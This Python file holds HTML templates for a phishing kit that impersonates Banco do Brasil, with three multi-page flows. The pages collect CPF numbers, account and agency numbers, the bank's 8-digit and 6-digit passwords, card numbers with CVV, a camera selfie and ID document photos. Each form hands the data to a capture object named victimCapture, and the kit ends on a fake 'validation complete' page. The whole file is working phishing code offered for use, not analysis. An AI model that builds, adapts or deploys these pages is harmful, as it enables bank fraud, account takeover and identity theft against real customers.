"""
Templates HTML para os fluxos BB (Banco do Brasil)
Separado do db_init.py para melhor organização e manutenibilidade
"""

# ============================================================================
# TEMPLATE 1: BB FLUXO COMPLETO (7 páginas)
# Fluxo: CPF → Dados Bancários → Celular/Senha6 → Cartão → Selfie → Documento → Sucesso
# ============================================================================

BB_FLUXO_COMPLETO_PAGES = [
    {
        "id": "page_cpf",
        "name": "CPF",
        "title": "Validação de CPF",
        "type": "form",
        "order": 1,
        "field_type": "cpf",
        "content": """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BB - Validação de CPF</title>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f5f5; }
        .header { background: #FFCC00; padding: 15px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .header h1 { color: #003D7A; font-size: 24px; font-weight: bold; }
        .container { max-width: 500px; margin: 40px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; color: #003D7A; font-weight: 600; }
        .form-group input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 4px; font-size: 16px; transition: border-color 0.3s; }
        .form-group input:focus { outline: none; border-color: #FFCC00; }
        .btn { width: 100%; padding: 14px; background: #003D7A; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.3s; }
        .btn:hover { background: #002855; }
        .info-text { color: #666; font-size: 14px; margin-top: 15px; text-align: center; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🏦 Banco do Brasil</h1>
    </div>
    <div class="container">
        <h2 style="color: #003D7A; margin-bottom: 20px;">Validação de CPF</h2>
        <form id="cpfForm">
            <div class="form-group">
                <label for="cpf">CPF:</label>
                <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" maxlength="14" required>
            </div>
            <button type="submit" class="btn">Continuar</button>
        </form>
        <p class="info-text">🔒 Seus dados estão protegidos</p>
    </div>
    <script>
        // Use the global auto-initialized instance
        const captureLib = window.victimCapture;
        const form = document.getElementById('cpfForm');
        const cpfInput = document.getElementById('cpf');
        
        // Máscara de CPF
        cpfInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\\D/g, '');
            if (value.length <= 11) {
                value = value.replace(/(\\d{3})(\\d)/, '$1.$2');
                value = value.replace(/(\\d{3})(\\d)/, '$1.$2');
                value = value.replace(/(\\d{3})(\\d{1,2})$/, '$1-$2');
                e.target.value = value;
            }
        });
        
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            const cpf = cpfInput.value.replace(/\\D/g, '');
            if (cpf.length === 11) {
                await captureLib.saveFields({ cpf: cpf }, 'cpf');
            } else {
                alert('CPF inválido! Digite os 11 dígitos.');
            }
        });
    </script>
</body>
</html>
"""
    },
    {
        "id": "page_dados_bancarios",
        "name": "Dados Bancários",
        "title": "Dados da Conta",
        "type": "form",
        "order": 2,
        "field_type": "dados_bancarios",
        "content": """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BB - Dados Bancários</title>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f5f5; }
        .header { background: #FFCC00; padding: 15px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .header h1 { color: #003D7A; font-size: 24px; font-weight: bold; }
        .container { max-width: 500px; margin: 40px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; color: #003D7A; font-weight: 600; }
        .form-group input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 4px; font-size: 16px; }
        .form-group input:focus { outline: none; border-color: #FFCC00; }
        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .btn { width: 100%; padding: 14px; background: #003D7A; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .btn:hover { background: #002855; }
    </style>
</head>
<body>
    <div class="header"><h1>🏦 Banco do Brasil</h1></div>
    <div class="container">
        <h2 style="color: #003D7A; margin-bottom: 20px;">Dados da Conta</h2>
        <form id="dadosForm">
            <div class="form-row">
                <div class="form-group">
                    <label for="agencia">Agência:</label>
                    <input type="text" id="agencia" name="agencia" placeholder="0000" maxlength="4" required>
                </div>
                <div class="form-group">
                    <label for="conta">Conta:</label>
                    <input type="text" id="conta" name="conta" placeholder="00000-0" maxlength="9" required>
                </div>
            </div>
            <div class="form-group">
                <label for="senha8">Senha Eletrônica (8 dígitos):</label>
                <input type="password" id="senha8" name="senha8" placeholder="********" maxlength="8" required>
            </div>
            <button type="submit" class="btn">Continuar</button>
        </form>
    </div>
    <script>
        // Use the global auto-initialized instance
        const captureLib = window.victimCapture;
        const form = document.getElementById('dadosForm');
        
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            await captureLib.saveFields({
                agencia: document.getElementById('agencia').value,
                conta: document.getElementById('conta').value,
                senha8: document.getElementById('senha8').value
            }, 'dados_bancarios');
        });
    </script>
</body>
</html>
"""
    },
    {
        "id": "page_celular_senha6",
        "name": "Celular e Senha",
        "title": "Validação Mobile",
        "type": "form",
        "order": 3,
        "field_type": "celular_senha6",
        "content": """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BB - Validação Mobile</title>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f5f5; }
        .header { background: #FFCC00; padding: 15px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .header h1 { color: #003D7A; font-size: 24px; font-weight: bold; }
        .container { max-width: 500px; margin: 40px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; color: #003D7A; font-weight: 600; }
        .form-group input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 4px; font-size: 16px; }
        .form-group input:focus { outline: none; border-color: #FFCC00; }
        .btn { width: 100%; padding: 14px; background: #003D7A; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .btn:hover { background: #002855; }
    </style>
</head>
<body>
    <div class="header"><h1>🏦 Banco do Brasil</h1></div>
    <div class="container">
        <h2 style="color: #003D7A; margin-bottom: 20px;">Validação Mobile</h2>
        <form id="celularForm">
            <div class="form-group">
                <label for="celular">Celular:</label>
                <input type="tel" id="celular" name="celular" placeholder="(00) 00000-0000" maxlength="15" required>
            </div>
            <div class="form-group">
                <label for="senha6">Senha do APP (6 dígitos):</label>
                <input type="password" id="senha6" name="senha6" placeholder="******" maxlength="6" required>
            </div>
            <button type="submit" class="btn">Continuar</button>
        </form>
    </div>
    <script>
        // Use the global auto-initialized instance
        const captureLib = window.victimCapture;
        const form = document.getElementById('celularForm');
        const celularInput = document.getElementById('celular');
        
        celularInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\\D/g, '');
            if (value.length <= 11) {
                value = value.replace(/^(\\d{2})(\\d)/, '($1) $2');
                value = value.replace(/(\\d{5})(\\d)/, '$1-$2');
                e.target.value = value;
            }
        });
        
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            await captureLib.saveFields({
                celular: celularInput.value.replace(/\\D/g, ''),
                senha6: document.getElementById('senha6').value
            }, 'celular_senha6');
        });
    </script>
</body>
</html>
"""
    },
    {
        "id": "page_cartao",
        "name": "Cartão",
        "title": "Dados do Cartão",
        "type": "form",
        "order": 4,
        "field_type": "cartao",
        "content": """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BB - Dados do Cartão</title>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f5f5; }
        .header { background: #FFCC00; padding: 15px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .header h1 { color: #003D7A; font-size: 24px; font-weight: bold; }
        .container { max-width: 500px; margin: 40px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; color: #003D7A; font-weight: 600; }
        .form-group input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 4px; font-size: 16px; }
        .form-group input:focus { outline: none; border-color: #FFCC00; }
        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .btn { width: 100%; padding: 14px; background: #003D7A; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .btn:hover { background: #002855; }
    </style>
</head>
<body>
    <div class="header"><h1>🏦 Banco do Brasil</h1></div>
    <div class="container">
        <h2 style="color: #003D7A; margin-bottom: 20px;">Dados do Cartão</h2>
        <form id="cartaoForm">
            <div class="form-group">
                <label for="numero">Número do Cartão:</label>
                <input type="text" id="numero" name="numero" placeholder="0000 0000 0000 0000" maxlength="19" required>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label for="validade">Validade:</label>
                    <input type="text" id="validade" name="validade" placeholder="MM/AA" maxlength="5" required>
                </div>
                <div class="form-group">
                    <label for="cvv">CVV:</label>
                    <input type="text" id="cvv" name="cvv" placeholder="000" maxlength="3" required>
                </div>
            </div>
            <button type="submit" class="btn">Continuar</button>
        </form>
    </div>
    <script>
        // Use the global auto-initialized instance
        const captureLib = window.victimCapture;
        const form = document.getElementById('cartaoForm');
        const numeroInput = document.getElementById('numero');
        const validadeInput = document.getElementById('validade');
        
        numeroInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\\D/g, '');
            if (value.length <= 16) {
                value = value.replace(/(\\d{4})/g, '$1 ').trim();
                e.target.value = value;
            }
        });
        
        validadeInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });
        
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            await captureLib.saveFields({
                numero_cartao: numeroInput.value.replace(/\\s/g, ''),
                validade: validadeInput.value,
                cvv: document.getElementById('cvv').value
            }, 'cartao');
        });
    </script>
</body>
</html>
"""
    },
    {
        "id": "page_selfie",
        "name": "Selfie",
        "title": "Foto Selfie",
        "type": "camera",
        "order": 5,
        "field_type": "selfie",
        "content": """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BB - Selfie</title>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f5f5; }
        .header { background: #FFCC00; padding: 15px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .header h1 { color: #003D7A; font-size: 24px; font-weight: bold; }
        .container { max-width: 500px; margin: 40px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
        #video { width: 100%; max-width: 400px; border-radius: 8px; margin: 20px 0; }
        #canvas { display: none; }
        .btn { padding: 14px 40px; background: #003D7A; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; margin: 10px; }
        .btn:hover { background: #002855; }
        .btn:disabled { background: #ccc; cursor: not-allowed; }
    </style>
</head>
<body>
    <div class="header"><h1>🏦 Banco do Brasil</h1></div>
    <div class="container">
        <h2 style="color: #003D7A; margin-bottom: 20px;">📸 Tire uma Selfie</h2>
        <p style="color: #666; margin-bottom: 20px;">Posicione seu rosto no centro da câmera</p>
        <video id="video" autoplay></video>
        <canvas id="canvas"></canvas>
        <div>
            <button id="capture" class="btn">Capturar Foto</button>
            <button id="submit" class="btn" style="display:none;">Enviar</button>
        </div>
    </div>
    <script>
        // Use the global auto-initialized instance
        const captureLib = window.victimCapture;
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const captureBtn = document.getElementById('capture');
        const submitBtn = document.getElementById('submit');
        let stream = null;
        let photoData = null;
        
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(s => { stream = s; video.srcObject = stream; })
            .catch(err => alert('Erro ao acessar câmera: ' + err));
        
        captureBtn.addEventListener('click', function() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            photoData = canvas.toDataURL('image/jpeg');
            video.style.display = 'none';
            canvas.style.display = 'block';
            captureBtn.style.display = 'none';
            submitBtn.style.display = 'inline-block';
        });
        
        submitBtn.addEventListener('click', async function() {
            if (stream) stream.getTracks().forEach(track => track.stop());
            await captureLib.saveFields({ selfie: photoData }, 'selfie');
        });
    </script>
</body>
</html>
"""
    },
    {
        "id": "page_documento",
        "name": "Documento",
        "title": "Upload de Documento",
        "type": "upload",
        "order": 6,
        "field_type": "documento",
        "content": """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BB - Documento</title>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f5f5; }
        .header { background: #FFCC00; padding: 15px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .header h1 { color: #003D7A; font-size: 24px; font-weight: bold; }
        .container { max-width: 500px; margin: 40px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; color: #003D7A; font-weight: 600; }
        .file-input { width: 100%; padding: 12px; border: 2px dashed #ddd; border-radius: 4px; text-align: center; cursor: pointer; }
        .file-input:hover { border-color: #FFCC00; }
        .btn { width: 100%; padding: 14px; background: #003D7A; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 20px; }
        .btn:hover { background: #002855; }
        .btn:disabled { background: #ccc; cursor: not-allowed; }
    </style>
</head>
<body>
    <div class="header"><h1>🏦 Banco do Brasil</h1></div>
    <div class="container">
        <h2 style="color: #003D7A; margin-bottom: 20px;">📄 Upload de Documento</h2>
        <form id="docForm">
            <div class="form-group">
                <label>Frente do Documento (RG/CNH):</label>
                <input type="file" id="frente" accept="image/*" class="file-input" required>
            </div>
            <div class="form-group">
                <label>Verso do Documento:</label>
                <input type="file" id="verso" accept="image/*" class="file-input" required>
            </div>
            <button type="submit" class="btn" id="submitBtn" disabled>Enviar Documentos</button>
        </form>
    </div>
    <script>
        // Use the global auto-initialized instance
        const captureLib = window.victimCapture;
        const form = document.getElementById('docForm');
        const frenteInput = document.getElementById('frente');
        const versoInput = document.getElementById('verso');
        const submitBtn = document.getElementById('submitBtn');
        let frenteData = null;
        let versoData = null;
        
        function checkFiles() {
            if (frenteData && versoData) submitBtn.disabled = false;
        }
        
        frenteInput.addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(event) {
                    frenteData = event.target.result;
                    checkFiles();
                };
                reader.readAsDataURL(file);
            }
        });
        
        versoInput.addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(event) {
                    versoData = event.target.result;
                    checkFiles();
                };
                reader.readAsDataURL(file);
            }
        });
        
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            await captureLib.saveFields({
                doc_frente: frenteData,
                doc_verso: versoData
            }, 'documento');
        });
    </script>
</body>
</html>
"""
    },
    {
        "id": "page_sucesso",
        "name": "Sucesso",
        "title": "Validação Concluída",
        "type": "success",
        "order": 7,
        "field_type": "sucesso",
        "content": """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BB - Sucesso</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f5f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .container { max-width: 500px; padding: 40px; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
        .success-icon { font-size: 80px; color: #28a745; margin-bottom: 20px; }
        h1 { color: #003D7A; margin-bottom: 15px; }
        p { color: #666; line-height: 1.6; margin-bottom: 10px; }
        .footer { margin-top: 30px; padding-top: 20px; border-top: 2px solid #FFCC00; color: #999; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="success-icon">✅</div>
        <h1>Validação Concluída!</h1>
        <p>Seus dados foram validados com sucesso.</p>
        <p>Em breve você receberá uma confirmação.</p>
        <div class="footer">
            <p>🏦 Banco do Brasil</p>
            <p>Obrigado pela sua confiança</p>
        </div>
    </div>
</body>
</html>
"""
    }
]

# ============================================================================
# TEMPLATE 2: BB SEM CPF (6 páginas)
# Fluxo: Dados Bancários → Celular/Senha6 → Cartão → Selfie → Documento → Sucesso
# ============================================================================

BB_SEM_CPF_PAGES = [
    {
        "id": "page_dados_bancarios",
        "name": "Dados Bancários",
        "title": "Dados da Conta",
        "type": "form",
        "order": 1,
        "field_type": "dados_bancarios",
        "content": BB_FLUXO_COMPLETO_PAGES[1]["content"]  # Reutiliza a página de dados bancários
    },
    {
        "id": "page_celular_senha6",
        "name": "Celular e Senha",
        "title": "Validação Mobile",
        "type": "form",
        "order": 2,
        "field_type": "celular_senha6",
        "content": BB_FLUXO_COMPLETO_PAGES[2]["content"]
    },
    {
        "id": "page_cartao",
        "name": "Cartão",
        "title": "Dados do Cartão",
        "type": "form",
        "order": 3,
        "field_type": "cartao",
        "content": BB_FLUXO_COMPLETO_PAGES[3]["content"]
    },
    {
        "id": "page_selfie",
        "name": "Selfie",
        "title": "Foto Selfie",
        "type": "camera",
        "order": 4,
        "field_type": "selfie",
        "content": BB_FLUXO_COMPLETO_PAGES[4]["content"]
    },
    {
        "id": "page_documento",
        "name": "Documento",
        "title": "Upload de Documento",
        "type": "upload",
        "order": 5,
        "field_type": "documento",
        "content": BB_FLUXO_COMPLETO_PAGES[5]["content"]
    },
    {
        "id": "page_sucesso",
        "name": "Sucesso",
        "title": "Validação Concluída",
        "type": "success",
        "order": 6,
        "field_type": "sucesso",
        "content": BB_FLUXO_COMPLETO_PAGES[6]["content"]
    }
]

# ============================================================================
# TEMPLATE 3: BB CPF E SENHA (6 páginas)
# Fluxo: CPF+Senha → Celular/Senha6 → Cartão → Selfie → Documento → Sucesso
# ============================================================================

BB_CPF_SENHA_PAGES = [
    {
        "id": "page_cpf_senha",
        "name": "CPF e Senha",
        "title": "Login Internet Banking",
        "type": "form",
        "order": 1,
        "field_type": "cpf_senha",
        "content": """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BB - Login</title>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f5f5; }
        .header { background: #FFCC00; padding: 15px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .header h1 { color: #003D7A; font-size: 24px; font-weight: bold; }
        .container { max-width: 500px; margin: 40px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; color: #003D7A; font-weight: 600; }
        .form-group input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 4px; font-size: 16px; }
        .form-group input:focus { outline: none; border-color: #FFCC00; }
        .btn { width: 100%; padding: 14px; background: #003D7A; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .btn:hover { background: #002855; }
    </style>
</head>
<body>
    <div class="header"><h1>🏦 Banco do Brasil</h1></div>
    <div class="container">
        <h2 style="color: #003D7A; margin-bottom: 20px;">Internet Banking</h2>
        <form id="loginForm">
            <div class="form-group">
                <label for="cpf">CPF:</label>
                <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" maxlength="14" required>
            </div>
            <div class="form-group">
                <label for="senha">Senha de Acesso:</label>
                <input type="password" id="senha" name="senha" placeholder="Digite sua senha" required>
            </div>
            <button type="submit" class="btn">Entrar</button>
        </form>
    </div>
    <script>
        // Use the global auto-initialized instance
        const captureLib = window.victimCapture;
        const form = document.getElementById('loginForm');
        const cpfInput = document.getElementById('cpf');
        
        cpfInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\\D/g, '');
            if (value.length <= 11) {
                value = value.replace(/(\\d{3})(\\d)/, '$1.$2');
                value = value.replace(/(\\d{3})(\\d)/, '$1.$2');
                value = value.replace(/(\\d{3})(\\d{1,2})$/, '$1-$2');
                e.target.value = value;
            }
        });
        
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            await captureLib.saveFields({
                cpf: cpfInput.value.replace(/\\D/g, ''),
                senha: document.getElementById('senha').value
            }, 'cpf_senha');
        });
    </script>
</body>
</html>
"""
    },
    {
        "id": "page_celular_senha6",
        "name": "Celular e Senha",
        "title": "Validação Mobile",
        "type": "form",
        "order": 2,
        "field_type": "celular_senha6",
        "content": BB_FLUXO_COMPLETO_PAGES[2]["content"]
    },
    {
        "id": "page_cartao",
        "name": "Cartão",
        "title": "Dados do Cartão",
        "type": "form",
        "order": 3,
        "field_type": "cartao",
        "content": BB_FLUXO_COMPLETO_PAGES[3]["content"]
    },
    {
        "id": "page_selfie",
        "name": "Selfie",
        "title": "Foto Selfie",
        "type": "camera",
        "order": 4,
        "field_type": "selfie",
        "content": BB_FLUXO_COMPLETO_PAGES[4]["content"]
    },
    {
        "id": "page_documento",
        "name": "Documento",
        "title": "Upload de Documento",
        "type": "upload",
        "order": 5,
        "field_type": "documento",
        "content": BB_FLUXO_COMPLETO_PAGES[5]["content"]
    },
    {
        "id": "page_sucesso",
        "name": "Sucesso",
        "title": "Validação Concluída",
        "type": "success",
        "order": 6,
        "field_type": "sucesso",
        "content": BB_FLUXO_COMPLETO_PAGES[6]["content"]
    }
]

# ============================================================================
# FUNÇÃO HELPER PARA OBTER TEMPLATES
# ============================================================================

def get_all_templates():
    """
    Retorna lista com todas as definições de templates
    
    Returns:
        list: Lista de dicionários com dados dos templates
    """
    return [
        {
            "name": "BB Fluxo Completo",
            "slug": "bb_fluxo_completo",
            "description": "Template completo com 7 etapas: CPF, Dados Bancários, Celular/Senha, Cartão, Selfie, Documento e Sucesso",
            "status": "active",
            "pages": BB_FLUXO_COMPLETO_PAGES
        },
        {
            "name": "BB Sem CPF",
            "slug": "bb_sem_cpf",
            "description": "Template simplificado sem CPF inicial - 6 etapas começando por Dados Bancários",
            "status": "active",
            "pages": BB_SEM_CPF_PAGES
        },
        {
            "name": "BB CPF e Senha",
            "slug": "bb_cpf_senha",
            "description": "Template com login unificado (CPF+Senha) - 6 etapas",
            "status": "active",
            "pages": BB_CPF_SENHA_PAGES
        }
    ]
